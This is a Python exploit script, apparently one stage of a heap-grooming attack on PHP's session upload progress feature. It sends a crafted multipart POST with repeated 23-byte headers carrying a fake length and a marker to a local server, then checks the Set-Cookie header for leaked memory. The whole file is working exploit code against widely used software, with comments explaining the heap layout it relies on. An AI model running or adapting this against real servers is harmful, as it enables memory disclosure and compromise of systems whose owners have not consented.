#!/usr/bin/env python3
"""B (pure HTTP): session id from the Cookie header, single progress part with
N unknown 23-byte headers.  The A leaves PS(id)=chunk+0x6e080 in the 24B page;
the last part's header smart_strings stay live through the END cleanup, so the
24B page is not re-binned and slot6 (chunk+0x6e090) carries our fake len.
usage: b_24cookie.py [MARK] [N]
"""
import socket,sys,struct
MARK=(sys.argv[1] if len(sys.argv)>1 else 'MARKMARK').encode()[:8].ljust(8,b'M')
N=int(sys.argv[2]) if len(sys.argv)>2 else 24
BND=b'B'*10
val=struct.pack('<Q',0x1000)+MARK+b'F'*7
assert len(val)==23
h=b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n'
for i in range(N):
    h += b'X-%02d: '%i + val + b'\r\n'
o=bytearray()
o+=b'--'+BND+b'\r\n'+h+b'\r\n'+b'pwn'+b'\r\n'
o+=b'--'+BND+b'--\r\n'
req=(f'POST /plain.php HTTP/1.1\r\nHost: 127.0.0.1:8088\r\nCookie: PHPSESSID=attacksessionid0001\r\nContent-Type: multipart/form-data; boundary={BND.decode()}\r\nContent-Length: {len(o)}\r\nConnection: close\r\n\r\n').encode()
s=socket.create_connection(('127.0.0.1',8088),timeout=20); s.settimeout(20)
data=b''
try:
    s.sendall(req+bytes(o))
    while len(data)<400000:
        c=s.recv(65536)
        if not c: break
        data+=c
except OSError as e: print('recv_err',repr(e))
s.close()
open('/tmp/b_24cookie.resp','wb').write(data)
head,_,rest=data.partition(b'\r\n\r\n')
print('RESP_LEN',len(data))
for line in head.split(b'\r\n'):
    if line.lower().startswith(b'set-cookie'):
        print('SETCOOKIE_LEN',len(line))
        print('MARKPOS',line.find(MARK))
        print('VALUE',line[:180].decode('latin1','replace'))
print('BODY',rest[:80].decode('latin1','replace'))
